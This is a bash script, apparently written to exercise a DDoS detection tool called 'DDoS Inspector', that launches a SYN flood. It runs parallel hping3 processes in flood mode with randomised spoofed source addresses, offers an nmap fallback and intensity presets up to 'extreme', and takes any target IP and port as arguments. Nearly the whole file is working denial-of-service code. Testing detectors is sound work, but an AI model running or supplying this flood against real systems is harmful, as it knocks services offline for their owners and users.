#!/bin/bash

# Efficient SYN Flood Attack Script
# Uses more efficient methods to generate high packet rates

TARGET_IP=${1:-"127.0.0.1"}
TARGET_PORT=${2:-"80"}
DURATION=${3:-"30"}
INTENSITY=${4:-"high"}

echo "🚀 Starting Efficient SYN Flood Attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "Intensity: $INTENSITY"

case $INTENSITY in
    "low")
        RATE=100       # 100 packets/sec
        PARALLEL=2
        ;;
    "medium") 
        RATE=1000      # 1000 packets/sec
        PARALLEL=5
        ;;
    "high")
        RATE=5000      # 5000 packets/sec
        PARALLEL=10
        ;;
    "extreme")
        RATE=10000     # 10000 packets/sec
        PARALLEL=20
        ;;
esac

echo "📊 Attack Parameters:"
echo "  - Rate: $RATE packets/second"
echo "  - Parallel processes: $PARALLEL" 
echo "  - Total packets: $((RATE * DURATION))"
echo ""

# Function to send efficient SYN flood using hping3 with burst mode
send_syn_flood_burst() {
    local process_id=$1
    local packets_per_process=$((RATE / PARALLEL))
    local packets_per_second=$((packets_per_process))
    
    echo "Process $process_id: Sending $packets_per_second packets/sec"
    
    # Use hping3 in flood mode with count and interval
    # -i u1000 = 1000 microseconds = 1ms interval = 1000 pps max per process
    local interval_us=$((1000000 / packets_per_second))
    if [ $interval_us -lt 1000 ]; then
        interval_us=1000  # Minimum 1ms interval for stability
    fi
    
    # Run attack for specified duration
    timeout $DURATION hping3 -S -p $TARGET_PORT --flood --rand-source -i u$interval_us $TARGET_IP >/dev/null 2>&1 &
    
    return $!
}

# Alternative method using nmap for comparison
send_syn_flood_nmap() {
    local process_id=$1
    echo "Process $process_id: Using nmap SYN scan method"
    
    # Use nmap with timing template for fast scanning
    for ((i=0; i<DURATION; i++)); do
        timeout 1 nmap -sS -T5 --min-rate $((RATE/PARALLEL/DURATION)) -p $TARGET_PORT $TARGET_IP >/dev/null 2>&1 &
        sleep 1
    done
}

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo "⚠️  hping3 not found. Installing..."
    sudo apt-get update && sudo apt-get install -y hping3
fi

# Check if nmap is installed
if ! command -v nmap &> /dev/null; then
    echo "⚠️  nmap not found. Installing..."
    sudo apt-get update && sudo apt-get install -y nmap
fi

echo "🎯 Starting efficient SYN flood attack..."
echo "⏱️  This will run for $DURATION seconds"
echo "🔥 Using hping3 flood mode for maximum efficiency"

# Start parallel attack processes
PIDS=()
for ((p=1; p<=PARALLEL; p++)); do
    send_syn_flood_burst $p &
    PIDS+=($!)
done

# Monitor attack progress
start_time=$(date +%s)
echo "📊 Monitoring attack progress..."

while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))
    
    if [ $elapsed -ge $DURATION ]; then
        break
    fi
    
    # Show progress
    remaining=$((DURATION - elapsed))
    estimated_packets=$((RATE * elapsed))
    echo "⏳ Attack in progress... ${remaining}s remaining (targeting ~$estimated_packets packets)"
    sleep 2
done

# Clean up background processes
echo "🛑 Stopping attack processes..."
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null || true
done

# Kill any remaining hping3 processes
pkill -f "hping3.*$TARGET_IP" 2>/dev/null || true
sleep 2

echo "✅ Efficient SYN flood attack completed"
echo "📈 Targeted packets: ~$((RATE * DURATION))"
echo "🔍 Check your DDoS Inspector stats for actual detection"
echo ""
echo "💡 This script should generate much higher packet rates"
echo "   Check the stats file to see if packet counts increased significantly"